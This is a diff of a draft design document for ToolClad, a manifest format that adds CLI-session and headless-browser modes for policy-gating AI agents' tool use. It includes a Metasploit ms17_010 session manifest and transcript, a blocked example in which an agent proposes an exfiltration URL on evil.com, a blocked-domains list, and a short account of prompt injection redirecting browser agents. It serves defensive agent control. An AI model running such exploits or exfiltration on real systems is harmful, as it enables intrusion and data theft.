@@ -4,7 +4,7 @@
 **Status**: Draft Design Document
 **Author**: Jascha Wanger / ThirdKey AI
 **Date**: 2026-03-20
-**License**: MIT (protocol specification), Apache 2.0 (Symbiont integration)  
+**License**: MIT (protocol specification), Apache 2.0 (Symbiont integration)
 
 ---
 
@@ -20,15 +20,19 @@ The broader ecosystem has no answer either. OpenShell/NemoClaw sandboxes agent e
 
 ## What ToolClad Is
 
-ToolClad is a declarative manifest format (`.clad.toml`) that defines the complete behavioral contract for a CLI tool: its typed parameters, validation rules, command construction template, output parsing, and metadata for policy integration. A single manifest file replaces wrapper scripts, MCP tool schemas, and execution wiring.
+ToolClad is a declarative manifest format (`.clad.toml`) that defines the complete behavioral contract for a tool: its typed parameters, validation rules, invocation mechanism, output parsing, and metadata for policy integration. A single manifest file replaces wrapper scripts, MCP tool schemas, and execution wiring.
 
-A ToolClad manifest answers three questions:
+A ToolClad manifest answers four questions:
 
 1. **What can this tool accept?** Typed parameters with validation constraints (enums, ranges, regex, scope checks, injection sanitization).
 2. **How do you invoke it?** A command template that interpolates validated parameters. The LLM never generates a command string.
-3. **What does it produce?** Output format declaration and parsing rules that normalize raw tool output into structured JSON.
+3. **What does it produce?** Output format declaration, parsing rules, and a mandatory output schema that normalize raw tool output into structured JSON. The LLM knows the shape of results before proposing a call.
+4. **What is the interaction model?** Three execution modes share a common governance layer:
+   - **Oneshot** (default): Execute a single command, return results.
+   - **Session**: Maintain a running CLI process (PTY) where each interaction is independently validated and policy-gated.
+   - **Browser**: Maintain a governed headless browser session where navigation, clicks, form submission, and JS execution are typed, scoped, and policy-gated.
 
-A universal executor reads the manifest, validates arguments against declared types, constructs the command from the template, executes with timeout and resource controls, parses output, and wraps everything in a standard evidence envelope.
+A universal executor reads the manifest, validates arguments against declared types, dispatches to the appropriate backend (shell command, PTY session, or browser engine), executes with timeout and resource controls, parses output, and wraps everything in a standard evidence envelope.
 
 ---
 
@@ -60,6 +64,26 @@ The manifest enables three properties that unstructured shell execution cannot:
 - **Static analysis**: You can determine what any tool can possibly do before it ever runs, by inspecting the manifest. Cedar policies can reference manifest-declared properties.
 - **Formal verification**: The parameter space is finite and enumerable for enum types, bounded for numeric types, and regex-constrained for string types. You can prove properties about valid invocations.
 - **Automatic policy generation**: A tool with a `target` parameter of type `scope_target` inherently requires scope authorization. Cedar policies can be derived from manifests.
+
+**For interactive tools, the security gap is even wider:**
+
+```
+Sandbox approach:    LLM types into PTY -> sandbox intercepts syscalls -> allow/deny
+ToolClad sessions:   LLM selects session command -> Gate validates pattern + scope + state
+                       -> SessionExecutor sends to PTY -> output framed and schema-validated
+```
+
+Sandboxing an interactive tool treats the entire session as a black box. An agent with an open `psql` connection could `DROP TABLE` as easily as `SELECT *` because both are text sent to a PTY. ToolClad session mode declares which commands are allowed (`[session.commands]`), validates each one against a regex pattern, applies independent Cedar policy evaluation per interaction, and tracks session state so policies can reference *where in the session* the agent is. The interactive tool becomes a typed, state-aware, policy-gated API surface.
+
+**For browser agents, the gap is critical:**
+
+```
+Current browser agents:  LLM generates CDP/Playwright actions -> hope it stays on-task
+ToolClad browser mode:   LLM selects browser command -> Gate validates URL scope + state
+                           -> BrowserExecutor sends CDP command -> page state captured
+```
+
+Browser agents today (Claude in Chrome, OpenAI Operator, Playwright-based agents) rely on the LLM's instruction-following to stay on allowed domains, avoid submitting sensitive forms, and not execute arbitrary JavaScript. That is prompt-based security. ToolClad browser mode makes it structural: navigation URLs are scope-checked against an allow-list of domains, form submission requires human approval, and JS execution is a separately gated high-risk command. The governance layer is identical to session mode; only the transport differs.
 
 ---
 
@@ -553,6 +577,553 @@ This is the JSON the agent receives. Every field is deterministic and machine-re
 
 ---
 
+## Stateful Sessions: CLI and Browser
+
+Beyond oneshot execution, ToolClad supports stateful sessions where a tool process stays alive across multiple agent interactions. The key design insight: the governance layer (typed commands, per-interaction Cedar gating, scope enforcement, state-aware policies, output schema validation, evidence capture) is transport-agnostic. What changes between session types is the transport backend.
+
+| Mode | Backend | State Source | Ready Signal | Use Case |
+|---|---|---|---|---|
+| `oneshot` | Shell command | N/A | Process exit | Single invocations (nmap, curl, jq) |
+| `session` | PTY (pseudo-terminal) | Prompt regex parsing | Prompt pattern match | Interactive CLIs (msfconsole, psql, gdb) |
+| `browser` | CDP / Playwright API | URL + DOM inspection | Page load + network idle | Web interaction (testing, scraping, form filling) |
+
+All three share: typed commands, per-interaction Cedar policy evaluation, scope enforcement, output schema validation, evidence capture, and audit trail. The manifest format is the same. The executor implementation differs.
+
+### The Problem with Stateful Tools
+
+Tools like `msfconsole`, `psql`, `redis-cli`, headless browsers, and cloud CLI interactive modes maintain a running process that accepts commands over time. The oneshot model (validate, construct, execute, parse) does not fit because:
+
+1. The tool stays alive across multiple agent interactions
+2. Each interaction changes the tool's internal state (loaded module, connected database, current page)
+3. The agent needs to see intermediate output to decide its next command
+4. Different commands within the same session carry different risk levels
+
+Sandboxing the entire process treats the session as a black box. It can block dangerous syscalls but cannot govern *what the agent says* to the tool. An agent with an open `psql` session could `DROP TABLE` as easily as `SELECT *`. An agent with a browser could navigate to any domain. ToolClad stateful sessions declare which commands are allowed, validate each one independently, and gate every interaction through Cedar policy evaluation.
+
+---
+
+### CLI Session Mode
+
+CLI session mode manages interactive command-line tools through a PTY (pseudo-terminal). The agent sends typed, validated commands to a running process and receives structured output parsed from the terminal stream.
+
+#### Per-Interaction ORGA Gating
+
+Session mode turns each round of interaction into its own ORGA cycle:
+
+```
+Iteration 1:
+  Observe:  "psql is ready, showing dbname=> prompt"
+  Reason:   LLM proposes "SELECT * FROM users LIMIT 10"
+  Gate:     Cedar checks: is SELECT allowed? Is this agent read-only?
+            ToolClad validates: command matches read_query pattern
+  Act:      SessionExecutor sends command to PTY, waits for next prompt
+
+Iteration 2:
+  Observe:  "Query returned 10 rows, showing dbname=> prompt"
+  Reason:   LLM proposes "DROP TABLE users"
+  Gate:     Cedar checks: is DROP allowed? -> DENY
+  Act:      (blocked, denial fed back to agent)
+```
+
+Every command the agent sends to the interactive tool passes through Cedar policy evaluation and ToolClad pattern validation. The LLM cannot free-type into a terminal. It selects from declared, validated, policy-gated operations.
+
+#### Session Manifest
+
+```toml
+# tools/msfconsole.clad.toml
+[tool]
+name = "msfconsole_session"
+binary = "msfconsole"
+mode = "session"
+description = "Interactive Metasploit Framework session"
+risk_tier = "high"
+
+[tool.cedar]
+resource = "PenTest::ScanTarget"
+action = "execute_tool"
+
+[tool.evidence]
+output_dir = "{evidence_dir}/{session_id}-msf"
+capture = true
+hash = "sha256"
+
+# --- Session Lifecycle ---
+
+[session]
+startup_command = "msfconsole -q -x 'color false'"
+ready_pattern = "^msf[0-9].*> $"
+startup_timeout_seconds = 30
+idle_timeout_seconds = 300
+session_timeout_seconds = 1800
+max_interactions = 100
+
+[session.interaction]
+input_sanitize = ["injection"]
+output_max_bytes = 1048576
+output_wait_ms = 2000
+
+# --- Session Commands (the allow-list) ---
+# Each command becomes an MCP tool: msfconsole_session.use_module, etc.
+
+[session.commands.use_module]
+pattern = "^use (exploit|auxiliary|post)/[a-zA-Z0-9_/]+$"
+description = "Load a Metasploit module"
+risk_tier = "medium"
+
+[session.commands.set_option]
+pattern = "^set [A-Za-z0-9_]+ .+$"
+description = "Set a module option"
+risk_tier = "low"
+
+[session.commands.set_target]
+pattern = "^set RHOSTS .+$"
+description = "Set the target"
+extract_target = true
+risk_tier = "medium"
+
+[session.commands.run]
+pattern = "^(run|exploit)$"
+description = "Execute the loaded module"
+risk_tier = "high"
+human_approval = true
+
+[session.commands.sessions_list]
+pattern = "^sessions -l$"
+description = "List active sessions"
+risk_tier = "low"
+
+# --- Output Schema ---
+
+[output.schema]
+type = "object"
+
+[output.schema.properties.prompt]
+type = "string"
+description = "Current tool prompt (indicates internal state)"
+
+[output.schema.properties.output]
+type = "string"
+description = "Tool output from the last command"
+
+[output.schema.properties.session_state]
+type = "string"
+enum = ["ready", "module_loaded", "configured", "running", "completed", "error"]
+description = "Inferred session state from prompt analysis"
+
+[output.schema.properties.interaction_count]
+type = "integer"
+description = "Number of interactions in this session so far"
+```
+
+#### Session Commands as Typed MCP Tools
+
+The `[session.commands]` section is the critical difference from open-ended terminal access. Each declared command becomes a separate MCP tool visible to the LLM during the session:
+
+| MCP Tool Name | LLM Sees | Agent Provides |
+|---|---|---|
+| `msfconsole_session.use_module` | "Load a Metasploit module" | `{ "command": "use exploit/windows/smb/ms17_010" }` |
+| `msfconsole_session.set_target` | "Set the target" | `{ "command": "set RHOSTS 10.0.1.5" }` |
+| `msfconsole_session.run` | "Execute the loaded module" | `{ "command": "run" }` |
+
+The LLM never sees a free-text input field. It picks from typed operations. The parameter is validated against the command's `pattern` regex, scope-checked if `extract_target = true`, and policy-gated at the command's declared `risk_tier`. A command that does not match any declared pattern is rejected before it reaches the PTY.
+
+#### Prompt-Based State Inference
+
+The `ready_pattern` regex tells the SessionExecutor when the tool is waiting for input. But different prompts reveal different internal states:
+
+| Prompt | Inferred State |
+|---|---|
+| `msf6 >` | `ready` (no module loaded) |
+| `msf6 exploit(ms17_010) >` | `module_loaded` |
+| `msf6 exploit(ms17_010) > [*] ...` | `running` |
+| `dbname=>` | `ready` (psql, connected) |
+| `dbname=#` | `ready` (psql, superuser, higher risk tier) |
+
+The executor parses prompt changes and reports `session_state` in the output schema. Cedar policies can reference session state for authorization decisions:
+
+```cedar
+// Only allow "run" when module is configured
+permit (
+    principal == PenTest::Phase::"exploit",
+    action == PenTest::Action::"execute_tool",
+    resource
+)
+when {
+    resource.tool_name == "msfconsole_session.run" &&
+    resource.session_state == "configured"
+};
+```
+
+This means Cedar governs not just *what* the agent can do, but *when* in the session it can do it. State-aware, interaction-count-aware, time-aware governance on an interactive tool, all evaluated outside LLM influence.
+
+#### SessionExecutor Architecture
+
+The SessionExecutor manages the tool process via a PTY (pseudo-terminal):
+
+```
+Agent ORGA Loop              SessionExecutor                Tool Process (PTY)
+     |                            |                              |
+     |  propose command           |                              |
+     |--------------------------->|                              |
+     |                            |  validate against pattern    |
+     |                            |  check scope (if extract)    |
+     |                            |  Cedar policy evaluation     |
+     |                            |                              |
+     |                     [if allowed]                          |
+     |                            |  write to PTY stdin          |
+     |                            |----------------------------->|
+     |                            |                              |
+     |                            |  read until ready_pattern    |
+     |                            |<-----------------------------|
+     |                            |                              |
+     |                            |  parse prompt -> state       |
+     |                            |  frame output                |
+     |                            |  validate against schema     |
+     |                            |  wrap in evidence envelope   |
+     |                            |                              |
+     |  {prompt, output, state}   |                              |
+     |<---------------------------|                              |
+     |                            |                              |
+  [next ORGA iteration]
+```
+
+The SessionExecutor handles:
+
+- **PTY allocation and management**: Spawns the tool in a pseudo-terminal, handles SIGWINCH, manages process lifecycle
+- **Prompt detection**: Watches stdout for `ready_pattern` matches to know when the tool is waiting for input vs. still producing output
+- **Output framing**: Extracts the meaningful output between the sent command and the next prompt, stripping echoed input and ANSI escape codes
+- **State inference**: Parses prompt changes to update `session_state`
+- **Timeout enforcement**: Kills the session if `idle_timeout`, `session_timeout`, or `max_interactions` are exceeded
+- **Evidence capture**: Logs the full session transcript with timestamps, command/response pairs, and policy decisions for the cryptographic audit trail
+
+#### Session Lifecycle
+
+```
+spawn -> startup -> ready -> interact -> ... -> terminate
+  |                   |         |                    |
+  |  startup_command  |  agent  |  idle_timeout      |
+  |  wait for         |  sends  |  session_timeout   |
+  |  ready_pattern    |  cmds   |  max_interactions  |
+  |                   |         |  explicit close     |
+  |  startup_timeout  |         |  agent terminates   |
+  |  exceeded? FAIL   |         |                    |
+```
+
+Sessions are scoped to a single agent ORGA loop. When the loop completes (task done, timeout, or error), the SessionExecutor terminates the process and finalizes the evidence transcript. Sessions do not persist across agent restarts. This is deliberate: a session is an ephemeral execution context, not durable state.
+
+#### CLI Session Applications
+
+Session mode applies to any interactive tool where governance matters:
+
+| Tool | Session Commands | Governance Value |
+|---|---|---|
+| `psql` / `mysql` | `select_query`, `insert`, `update`, `create_table`, `drop_table` | Read-only agents cannot mutate. DDL requires human approval. |
+| `redis-cli` | `get`, `set`, `del`, `keys`, `flushdb` | Agents can read/write keys but `flushdb` requires approval. |
+| `kubectl exec` | `get`, `describe`, `logs`, `delete`, `apply` | Agents can inspect but destructive operations are gated. |
+| `gdb` / `lldb` | `info`, `backtrace`, `print`, `set`, `continue`, `kill` | Agents can inspect state but `set` and `kill` are gated. |
+| `aws` / `gcloud` | Subcommand-specific patterns | Read operations allowed, write/delete operations gated by resource type. |
+| `python3` / `node` | REPL commands with import restrictions | Agent can compute but cannot import `os`, `subprocess`, `socket`. |
+
+---
+
+### Browser Mode
+
+Browser mode manages headless browser sessions through CDP (Chrome DevTools Protocol) or Playwright. The governance model is identical to CLI session mode: typed commands, per-interaction Cedar gating, scope enforcement, state-aware policies, output schema validation, evidence capture. The transport is a browser engine instead of a PTY.
+
+#### Why Browser Agents Need Structural Governance
+
+Browser agents today (Claude in Chrome, OpenAI Operator, Playwright-based automation) rely on the LLM's instruction-following to stay on allowed domains, avoid submitting sensitive forms, and not execute arbitrary JavaScript. That is prompt-based security. A single prompt injection on a visited page can redirect the agent to an attacker-controlled domain, exfiltrate form data, or execute malicious scripts.
+
+ToolClad browser mode makes navigation, interaction, and execution structurally governed:
+
+- **URL scope enforcement**: Navigation targets are validated against an allow-list of domains before the CDP command fires. The agent cannot navigate outside scope regardless of what the LLM proposes.
+- **Command-level risk tiering**: Reading page content is low risk. Clicking a link is low risk. Submitting a form is high risk. Executing JavaScript is high risk and requires human approval. Each action is a separate typed command with its own Cedar policy.
+- **Page state as policy context**: Cedar policies can reference the current URL, domain, authentication status, and form presence. Rules like "block form submission on authenticated pages without human approval" are expressible.
+
+#### Browser Manifest
+
+```toml
+# tools/browser.clad.toml
+[tool]
+name = "browser_session"
+mode = "browser"
+description = "Governed headless browser session"
+risk_tier = "medium"
+
+[tool.cedar]
+resource = "Web::BrowserSession"
+action = "browse"
+
+[tool.evidence]
+output_dir = "{evidence_dir}/{session_id}-browser"
+capture = true
+hash = "sha256"
+screenshots = true
+
+# --- Browser Lifecycle ---
+
+[browser]
+engine = "playwright"
+headless = true
+startup_timeout_seconds = 10
+session_timeout_seconds = 600
+idle_timeout_seconds = 120
+max_interactions = 200
+
+# Scope enforcement on navigation
+[browser.scope]
+allowed_domains = ["*.example.com", "docs.example.com"]
+blocked_domains = ["*.evil.com", "admin.*"]
+allow_external = false
+
+# --- Browser Commands ---
+
+[browser.commands.navigate]
+description = "Navigate to a URL"
+risk_tier = "medium"
+args.url = { type = "url", schemes = ["https"], scope_check = true }
+
+[browser.commands.click]
+description = "Click an element by CSS selector"
+risk_tier = "low"
+args.selector = { type = "string", pattern = "^[a-zA-Z0-9_.#\\[\\]=\"' >:()-]+$" }
+
+[browser.commands.type_text]
+description = "Type text into an input field"
+risk_tier = "low"
+args.selector = { type = "string" }
+args.text = { type = "string", sanitize = ["injection"] }
+
+[browser.commands.submit_form]
+description = "Submit a form"
+risk_tier = "high"
+human_approval = true
+args.selector = { type = "string" }
+
+[browser.commands.extract]
+description = "Extract text content from elements"
+risk_tier = "low"
+args.selector = { type = "string" }
+
+[browser.commands.screenshot]
+description = "Capture page screenshot"
+risk_tier = "low"
+
+[browser.commands.execute_js]
+description = "Execute JavaScript on the page"
+risk_tier = "high"
+human_approval = true
+args.script = { type = "string" }
+
+[browser.commands.wait_for]
+description = "Wait for an element to appear"
+risk_tier = "low"
+args.selector = { type = "string" }
+args.timeout_ms = { type = "integer", min = 100, max = 30000, default = 5000 }
+
+[browser.commands.go_back]
+description = "Navigate back in browser history"
+risk_tier = "low"
+
+# --- State Inference ---
+
+[browser.state]
+fields = ["url", "title", "domain", "has_forms", "is_authenticated", "page_loaded"]
+
+# --- Output Schema ---
+
+[output.schema]
+type = "object"
+
+[output.schema.properties.url]
+type = "string"
+description = "Current page URL after command"
+
+[output.schema.properties.title]
+type = "string"
+description = "Current page title"
+
+[output.schema.properties.domain]
+type = "string"
+description = "Current page domain (for policy context)"
+
+[output.schema.properties.content]
+type = "string"
+description = "Extracted text or command result"
+
+[output.schema.properties.screenshot_path]
+type = "string"
+description = "Path to screenshot evidence if captured"
+
+[output.schema.properties.page_state]
+type = "object"
+description = "Inferred page state for Cedar policy context"
+
+[output.schema.properties.page_state.properties.has_forms]
+type = "boolean"
+
+[output.schema.properties.page_state.properties.is_authenticated]
+type = "boolean"
+
+[output.schema.properties.page_state.properties.page_loaded]
+type = "boolean"
+
+[output.schema.properties.interaction_count]
+type = "integer"
+```
+
+#### Per-Interaction ORGA Gating (Browser)
+
+The ORGA loop works identically to CLI session mode. The transport differs; the governance is the same:
+
+```
+Iteration 1:
+  Observe:  {url: "https://app.example.com/login", title: "Login", has_forms: true}
+  Reason:   LLM proposes browser_session.type_text(selector="#email", text="user@co.com")
+  Gate:     Cedar: is type_text allowed? ToolClad: selector matches pattern, text is injection-safe
+  Act:      BrowserExecutor sends Playwright command, waits for page stable
+
+Iteration 2:
+  Observe:  {url: "https://app.example.com/login", title: "Login"}
+  Reason:   LLM proposes browser_session.submit_form(selector="#login-form")
+  Gate:     Cedar: submit_form requires human_approval -> PENDING
+  Act:      (blocked until human approves)
+
+Iteration 3:
+  Observe:  {url: "https://app.example.com/dashboard", is_authenticated: true}
+  Reason:   LLM proposes browser_session.navigate(url="https://evil.com/exfil?data=...")
+  Gate:     ToolClad: URL scope check -> DENY (domain not in allowed_domains)
+  Act:      (blocked, denial fed back to agent)
+```
+
+#### BrowserExecutor Architecture
+
+The BrowserExecutor wraps Playwright (or CDP directly) and provides the same interface as the SessionExecutor:
+
+```
+Agent ORGA Loop              BrowserExecutor               Browser Engine (CDP)
+     |                            |                              |
+     |  propose command           |                              |
+     |--------------------------->|                              |
+     |                            |  validate against command    |
+     |                            |  check URL scope (if nav)    |
+     |                            |  Cedar policy evaluation     |
+     |                            |                              |
+     |                     [if allowed]                          |
+     |                            |  send CDP/Playwright action  |
+     |                            |----------------------------->|
+     |                            |                              |
+     |                            |  wait: page load + idle      |
+     |                            |<-----------------------------|
+     |                            |                              |
+     |                            |  capture: URL, title, DOM    |
+     |                            |  infer page state            |
+     |                            |  screenshot (if configured)  |
+     |                            |  validate against schema     |
+     |                            |  wrap in evidence envelope   |
+     |                            |                              |
+     |  {url, title, content,     |                              |
+     |   page_state, screenshot}  |                              |
+     |<---------------------------|                              |
+     |                            |                              |
+  [next ORGA iteration]
+```
+
+The BrowserExecutor handles:
+
+- **Browser lifecycle**: Launch, page creation, navigation, cleanup
+- **Ready detection**: Waits for page load event + network idle (configurable) instead of prompt regex matching
+- **State inference**: Inspects URL, DOM (form presence, auth indicators like session cookies or user profile elements), and page title to populate `page_state` for Cedar policy context
+- **Screenshot evidence**: Captures page screenshots at each interaction for the audit trail
+- **Scope enforcement**: Intercepts all navigation (including redirects and link clicks) and validates target URLs against `[browser.scope]`
+- **Content extraction**: Returns structured page content (text, form values, table data) instead of raw HTML
+
+#### Cedar Policy Examples (Browser)
+
+```cedar
+// Allow navigation only to allowed domains
+permit (
+    principal,
+    action == Web::Action::"browse",
+    resource
+)
+when {
+    resource.command == "navigate" &&
+    resource.url_domain in Web::DomainSet::"allowed"
+};
+
+// Block form submission on authenticated pages without human approval
+forbid (
+    principal,
+    action == Web::Action::"browse",
+    resource
+)
+when {
+    resource.command == "submit_form" &&
+    resource.page_state.is_authenticated == true
+}
+unless {
+    resource.human_approved == true
+};
+
+// Block all JavaScript execution unless explicitly approved
+forbid (
+    principal,
+    action == Web::Action::"browse",
+    resource
+)
+when {
+    resource.command == "execute_js"
+}
+unless {
+    resource.human_approved == true
+};
+
+// Rate limit: max 5 form submissions per session
+forbid (
+    principal,
+    action == Web::Action::"browse",
+    resource
+)
+when {
+    resource.command == "submit_form" &&
+    resource.session_submit_count >= 5
+};
+```
+
+#### Browser-Specific Scope Enforcement
+
+URL scope checking is the browser equivalent of target scope checking on CLI tools like `nmap`. It operates at three levels:
+
+1. **Navigation commands**: The `navigate` command's URL is validated against `[browser.scope]` before the CDP command fires.
+2. **Redirect interception**: The BrowserExecutor intercepts HTTP redirects and validates each hop. A page at `allowed.example.com` that redirects to `evil.com` is blocked mid-redirect.
+3. **Link click validation**: When the agent uses `click` on a link, the executor resolves the `href` and validates before allowing the navigation.
+
+The `allow_external = false` setting is the strictest mode: the browser cannot leave the declared domain set under any circumstances. Setting `allow_external = true` allows navigation to unlisted domains but still blocks `blocked_domains`.
+
+#### Browser Mode Applications
+
+| Use Case | Commands Used | Governance Value |
+|---|---|---|
+| Web application testing | navigate, click, type_text, submit_form, extract | Scope-locked to test environment. Form submission gated. |
+| Competitive intelligence | navigate, extract, screenshot | Read-only. No form submission, no JS execution. |
+| Form filling / workflow automation | navigate, type_text, submit_form, extract | Human approval on submission. Scope-locked to target app. |
+| Web scraping | navigate, extract, click | Read-only. Rate-limited. Domain-locked. |
+| Authenticated workflows | navigate, type_text, submit_form, extract | Credential input gated. Post-auth actions require approval. |
+
+---
+
+### What Stateful Sessions Do Not Cover
+
+- **TUI tools** (`htop`, `lazygit`, `vim`): Tools with full-screen terminal UIs that require cursor positioning and screen state tracking. These need a screen-scraping layer that is out of scope for ToolClad.
+- **Sub-process spawning**: Tools that spawn child interactive sessions (msfconsole opening a meterpreter shell, browser spawning popups or new tabs). The current model tracks the top-level session only; nested sessions would need recursive management.
+- **Unsolicited streaming**: Tools that push data without being prompted (log tailing, event streams, WebSocket push). The current model assumes a request-response pattern with ready detection (prompt match or page load).
+- **Non-headless browsers**: Browser mode targets headless execution via CDP/Playwright. GUI browser automation with visual interaction (mouse coordinates, visual element recognition) is a different problem.
+
+These are candidates for future extensions, not v1 scope.
+
+---
+
 ## Symbiont Integration
 
 ### Runtime Discovery
@@ -786,35 +1357,43 @@ Of the 19 existing wrapper scripts:
 
 ### What is the open spec (MIT)
 
-- The `.clad.toml` manifest format
+- The `.clad.toml` manifest format (oneshot, session, and browser modes)
 - The type system and validation semantics
-- The command template syntax
-- The output envelope schema
+- The command template syntax (oneshot)
+- The session command declaration format (`[session.commands]`)
+- The browser command declaration format (`[browser.commands]`)
+- The browser scope declaration format (`[browser.scope]`)
+- The output envelope schema (oneshot and per-interaction)
+- The output schema declaration (`[output.schema]`)
 - The evidence metadata format
 - A reference validator (checks manifest correctness)
 
 ### What is the Symbiont implementation (Apache 2.0)
 
 - The universal executor (Rust, integrated with tokio async runtime)
+- The SessionExecutor (PTY management, prompt detection, state inference)
+- The BrowserExecutor (CDP/Playwright management, page state inference, redirect interception)
 - Cedar policy integration and automatic policy generation
-- ORGA Gate integration (two-layer validation)
-- Scope enforcement against `scope.toml`
-- Evidence chain with SHA-256 hashing and cryptographic audit trail
-- MCP schema auto-generation from manifests
+- ORGA Gate integration (two-layer validation for oneshot, per-interaction gating for sessions and browser)
+- Session/page state as Cedar policy context
+- URL scope enforcement with redirect interception (browser mode)
+- Target scope enforcement against `scope.toml` (oneshot and session modes)
+- Evidence chain with SHA-256 hashing, screenshot capture, and cryptographic audit trail
+- MCP schema auto-generation from manifests (inputSchema + outputSchema)
 - DSL tool reference resolution
-- Runtime auto-discovery and hot-reload of manifests
+- Runtime auto-discovery and hot-reload of manifests (dev mode only)
 
 ### Ecosystem Value
 
 Tool vendors and security teams publish `.clad.toml` manifests alongside their CLI tools. Agent frameworks consume them. Any runtime that supports the ToolClad format can safely invoke the tool. Symbiont's implementation is the most complete, with Cedar gating, ORGA enforcement, and cryptographic audit, but a minimal executor that just does argument validation and template interpolation is useful on its own.
 
-The manifest pairs naturally with SchemaPin. A tool distribution can include:
+A tool distribution includes:
 
 - The binary or installation instructions
 - A `.clad.toml` manifest (behavioral contract)
-- A SchemaPin signature over the manifest (cryptographic identity)
+- A SchemaPin signature in `.well-known/schemapin.json` (cryptographic identity over the manifest)
 
-Now you have a single, verifiable package that defines both what the tool is and how to invoke it safely.
+The vendor signs the manifest once with `schemapin-sign`. Consumers verify it with SchemaPin's existing TOFU pinning. No per-manifest configuration on either side. The manifest defines what the tool is and how to invoke it safely; SchemaPin proves it has not been tampered with.
 
 ---
 
@@ -876,29 +1455,76 @@ $ symbi tools schema nmap_scan
 {
   "name": "nmap_scan",
   "description": "Network port scanning and service detection",
-  "inputSchema": { ... }
+  "inputSchema": { ... },
+  "outputSchema": { ... }
 }
+```
+
+### `symbi tools sessions`
+
+Lists active session-mode tool sessions:
+
+```
+$ symbi tools sessions
+SESSION                              TOOL                  AGENT         STATE           INTERACTIONS  UPTIME
+a1b2c3d4-5678-...                    msfconsole_session    exploit       module_loaded   7             4m 23s
+e5f6a7b8-9012-...                    psql_session          data_agent    ready           12            1m 05s
+```
+
+### `symbi tools session <id> transcript`
+
+Dumps the full session transcript with timestamps and policy decisions:
+
+```
+$ symbi tools session a1b2c3d4 transcript
+[00:00.0] STARTUP  msfconsole -q -x 'color false'
+[00:03.2] READY    prompt="msf6 >" state=ready
+[00:03.5] INPUT    "use exploit/windows/smb/ms17_010"  cedar=ALLOW  pattern=use_module
+[00:04.1] OUTPUT   prompt="msf6 exploit(ms17_010) >" state=module_loaded
+[00:04.3] INPUT    "set RHOSTS 10.0.1.5"  cedar=ALLOW  scope=OK  pattern=set_target
+[00:04.8] OUTPUT   prompt="msf6 exploit(ms17_010) >" state=configured
+[00:05.0] INPUT    "run"  cedar=PENDING_APPROVAL  pattern=run
+[00:47.2] APPROVAL human=jascha  cedar=ALLOW
+[00:47.3] INPUT    "run"  cedar=ALLOW  pattern=run
+...
 ```
 
 ---
 
 ## SchemaPin Integration
 
-A ToolClad manifest can include a `[tool.schemapin]` section that ties the behavioral contract to cryptographic identity:
+SchemaPin signs `.clad.toml` files directly as first-class artifacts. No per-manifest configuration is needed.
 
-```toml
-[tool.schemapin]
-public_key_url = "https://thirdkey.ai/.well-known/schemapin/keys/nmap_scan.json"
-schema_hash_algorithm = "sha256"
+A ToolClad manifest *is* a tool schema. It is the most complete tool schema that exists, because it defines not just the input/output interface but the behavioral contract: validation rules, command templates, scope constraints, session commands, output parsers. SchemaPin's existing infrastructure handles it with zero changes to the manifest format.
+
+**Signing (tool vendor):**
+
+```bash
+schemapin-sign tools/nmap_scan.clad.toml
 ```
 
-The runtime can then:
+The signature and hash are published in the vendor's existing `.well-known/schemapin.json` discovery document alongside the tool name. No `[tool.schemapin]` section in the manifest. The manifest stays clean.
 
-1. Hash the manifest content
-2. Verify the hash against a SchemaPin signature
-3. Reject manifests that have been tampered with
+**Verification (runtime):**
 
-This creates a chain: SchemaPin verifies the manifest has not been modified. The manifest constrains what the tool can accept. Cedar authorizes whether this invocation is allowed. The executor constructs and runs the command. Each layer trusts the one before it.
+1. Runtime loads `nmap_scan.clad.toml` from `tools/`
+2. Runtime hashes the manifest content (SHA-256)
+3. Runtime looks up the tool's provider domain (from `toolclad.toml` or `symbiont.toml`)
+4. Runtime fetches `.well-known/schemapin.json` from the provider domain
+5. Runtime verifies the hash against the published signature using SchemaPin's existing TOFU pinning
+6. If verification fails, the manifest is rejected and the tool is not registered
+
+**What this protects:** The signature covers the *entire behavioral contract*. If someone tampers with a command template, a validation rule, a scope constraint, an output schema, or a session command pattern, the hash changes and verification fails. This is strictly stronger than signing only the MCP JSON Schema, because the JSON Schema does not capture execution behavior.
+
+**The trust chain:**
+
+```
+SchemaPin verifies the manifest has not been modified
+  -> The manifest constrains what the tool can accept
+    -> Cedar authorizes whether this invocation is allowed
+      -> The executor constructs and runs the command
+        -> Each layer trusts the one before it
+```
 
 ---
 
@@ -940,6 +1566,43 @@ The 80/20 split from symbi-redteam confirms this: ~14 of 19 tools are pure templ
 
 ## Remaining Open Questions
 
-1. **Bidirectional tools**: Some tools (msfconsole, interactive shells) produce output over time and accept further input. ToolClad v1 targets one-shot invocations. Streaming/interactive tools may need a v2 extension.
+1. **HTTP API backends**: The current design targets CLI tools (oneshot), interactive CLI tools (session), and browsers (browser). HTTP API tools could use similar manifests with an `[http]` execution section: endpoint URL, method, headers, request body template, response schema. This would let ToolClad govern REST/GraphQL API calls with the same typed, policy-gated pattern.
 
-2. **Non-CLI backends**: The current design targets CLI tools (`binary` + `template`). HTTP API tools (`curl`-style) and MCP server tools could use similar manifests with different execution sections (`[http]` or `[mcp]` instead of `[command]`).
+2. **MCP server passthrough**: Tools already exposed as MCP servers could use a `[mcp]` execution section that acts as a governed proxy: validate parameters against the manifest's stricter type system, apply Cedar policy, then forward to the MCP server. This would add ToolClad governance to existing MCP tools without rewriting them.
+
+3. **TUI tools**: Full-screen terminal applications (`htop`, `lazygit`, `vim`) require cursor positioning and screen state tracking. A screen-scraping adapter could expose TUI state as structured data, but the complexity may exceed what a manifest format should express.
+
+4. **Nested sessions**: Tools that spawn child interactive sessions (msfconsole opening a meterpreter shell, browser popups, `kubectl exec` opening a remote shell that itself runs `psql`) would need recursive session management. The v1 model tracks the top-level session only.
+
+5. **Unsolicited output**: Session and browser modes assume a request-response pattern with ready detection. Tools that push data without being prompted (log tailing, event streams, WebSocket push) would need an event-driven output model with its own schema and policy hooks.
+
+6. **Browser authentication flows**: Credential entry and OAuth flows require typing sensitive data into form fields. ToolClad should integrate with secrets management (Vault/OpenBao) so that credentials are injected by the executor, never visible to the LLM. The agent proposes "log in to app X" and the executor handles credential retrieval and entry.
+
+---
+
+## Changelog
+
+### v0.4.0 (2026-03-20)
+
+- Added Browser Mode as third execution backend (BrowserExecutor, CDP/Playwright, URL scope enforcement with redirect interception, page state inference, screenshot evidence)
+- Refactored "Session Mode" section into "Stateful Sessions: CLI and Browser" with shared governance layer and transport-specific backends
+- Added browser manifest example with `[browser]`, `[browser.scope]`, `[browser.commands]`, and `[browser.state]` sections
+- Added browser-specific Cedar policy examples (domain scope, form submission gating, JS execution gating, rate limiting)
